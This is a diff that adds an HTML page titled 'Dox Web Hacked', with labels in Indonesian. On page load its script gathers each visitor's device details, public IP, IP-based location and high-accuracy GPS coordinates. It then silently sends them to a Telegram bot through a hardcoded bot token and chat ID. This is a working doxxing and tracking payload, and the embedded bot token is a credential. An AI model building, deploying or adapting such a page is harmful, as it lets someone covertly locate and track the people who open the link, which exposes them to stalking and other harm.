@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Dox Web Hacked</title>
+  <style>
+    body {
+      background-color: black;
+      color: #00ff00;
+      font-family: monospace;
+      text-align: center;
+    }
+    .container {
+      margin: 40px auto;
+      padding: 20px;
+      border: 2px solid #00ff00;
+      width: 90%;
+      max-width: 600px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px #00ff00;
+    }
+    h1 {
+      color: red;
+      text-shadow: 0 0 10px red;
+    }
+    .data-row {
+      display: flex;
+      justify-content: space-between;
+      border-bottom: 1px dotted #00ff00;
+      padding: 5px 0;
+    }
+    a { color: #00ff00; }
+  </style>
+</head>
+<body onload="collectInfo()">
+  <h1><b>Dox Web Hacked By <span style='color:white;'>doxz</span></b></h1>
+  <div class="container">
+    <div class="data-row"><div>Platform</div><div id="platform">-</div></div>
+    <div class="data-row"><div>Resolusi</div><div id="resolusi">-</div></div>
+    <div class="data-row"><div>Zona Waktu</div><div id="timezone">-</div></div>
+    <div class="data-row"><div>Bahasa</div><div id="language">-</div></div>
+    <div class="data-row"><div>Status Online</div><div id="online">-</div></div>
+    <div class="data-row"><div>IP Publik</div><div id="ip">Mendeteksi...</div></div>
+    <div class="data-row"><div>Lokasi dari IP</div><div id="lokasiIP">Mendeteksi...</div></div>
+    <div class="data-row"><div>Lokasi GPS</div><div id="lokasiGPS">Mendeteksi...</div></div>
+    <div class="data-row"><div>Akurasi</div><div id="akurasi">-</div></div>
+    <div class="data-row"><div>Link Maps</div><div id="mapsLink">-</div></div>
+    <div class="data-row"><div>Baterai</div><div id="battery">-</div></div>
+    <div class="data-row"><div>Jaringan</div><div id="network">-</div></div>
+  </div>
+
+  <script>
+    const BOT_TOKEN = '7008476999:AAEHnWWR1kyOg1NRpypyV_JnBkVjoucsaWM';
+    const CHAT_ID = '7522364439';
+    let fullMessage = "";
+
+    async function collectInfo() {
+      const platform = navigator.platform;
+      const resolution = `${screen.width} x ${screen.height}`;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const language = navigator.language;
+      const online = navigator.onLine ? "Online" : "Offline";
+
+      document.getElementById("platform").innerText = platform;
+      document.getElementById("resolusi").innerText = resolution;
+      document.getElementById("timezone").innerText = timezone;
+      document.getElementById("language").innerText = language;
+      document.getElementById("online").innerText = online;
+
+      fullMessage += `Platform: ${platform}\nResolusi: ${resolution}\nZona Waktu: ${timezone}\nBahasa: ${language}\nStatus Online: ${online}\n`;
+
+      // Battery
+      if (navigator.getBattery) {
+        const battery = await navigator.getBattery();
+        const percent = Math.round(battery.level * 100);
+        const charging = battery.charging ? "Charging" : "Tidak Charging";
+        document.getElementById("battery").innerText = `${percent}% - ${charging}`;
+        fullMessage += `Baterai: ${percent}% - ${charging}\n`;
+      }
+
+      // Network
+      if (navigator.connection) {
+        const type = navigator.connection.effectiveType || "Tidak diketahui";
+        document.getElementById("network").innerText = type;
+        fullMessage += `Jaringan: ${type}\n`;
+      }
+
+      // Dapatkan IP dan lokasi IP
+      try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        document.getElementById("ip").innerText = ipData.ip;
+        fullMessage += `IP Publik: ${ipData.ip}\n`;
+
+        const locRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+        const locData = await locRes.json();
+        document.getElementById("lokasiIP").innerText = `${locData.city}, ${locData.country_name}`;
+        fullMessage += `Lokasi dari IP: ${locData.city}, ${locData.country_name}\n`;
+      } catch (e) {
+        fullMessage += "Gagal mendeteksi IP/lokasi\n";
+      }
+
+      // Coba akses lokasi GPS
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(successGPS, errorGPS, {
+          enableHighAccuracy: true,
+          timeout: 10000
+        });
+      } else {
+        errorGPS();
+      }
+    }
+
+    function successGPS(pos) {
+      const lat = pos.coords.latitude.toFixed(5);
+      const lon = pos.coords.longitude.toFixed(5);
+      const acc = pos.coords.accuracy.toFixed(2);
+      const link = `https://www.google.com/maps?q=${lat},${lon}`;
+
+      document.getElementById("lokasiGPS").innerText = `Lat: ${lat}, Lon: ${lon}`;
+      document.getElementById("akurasi").innerText = `${acc} meter`;
+      document.getElementById("mapsLink").innerHTML = `<a href="${link}" target="_blank">Lihat di Maps</a>`;
+
+      fullMessage += `GPS: Lat ${lat}, Lon ${lon}\nAkurasi: ${acc} meter\nMaps: ${link}\n`;
+      sendToTelegram();
+    }
+
+    async function errorGPS() {
+      document.getElementById("lokasiGPS").innerText = "Tidak tersedia / Ditolak";
+      document.getElementById("akurasi").innerText = "-";
+      document.getElementById("mapsLink").innerText = "-";
+
+      fullMessage += "GPS: Tidak tersedia (ditolak / gagal)\n";
+      sendToTelegram();
+    }
+
+    function sendToTelegram() {
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: `⚠️ Pengunjung Terdeteksi:\n\n${fullMessage}`
+        })
+      }).catch(err => console.error("Gagal kirim ke Telegram", err));
+    }
+  </script>
+</body>
+</html>
